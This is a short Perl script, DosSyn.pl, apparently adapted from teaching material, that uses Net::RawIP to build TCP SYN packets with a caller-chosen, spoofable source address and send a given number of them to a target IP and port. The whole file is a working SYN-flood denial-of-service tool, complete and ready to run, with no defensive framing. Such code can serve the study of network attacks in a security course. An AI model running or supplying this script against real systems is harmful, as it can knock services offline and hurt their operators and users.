#!/usr/bin/perl
### DosSyn.pl
### Slightly modified from an original script of A. Kak by
### carlo.nicola@fhnw.ch
use strict;
use Net::RawIP;
die "usage syntax>> DoSSyn.pl sourceIP sourcePort " .
"destIP destPort noOfPackets $!\n"
unless @ARGV == 5;
my ($srcIP, $srcPort, $destIP, $destPort, $count) = @ARGV;
my $packet = new Net::RawIP;
$packet->set({ip => {saddr => $srcIP,
daddr => $destIP},
tcp => {source => $srcPort,
dest => $destPort,
syn => 1,
seq => 100200}});
for (1..$count){
$packet->send;
}
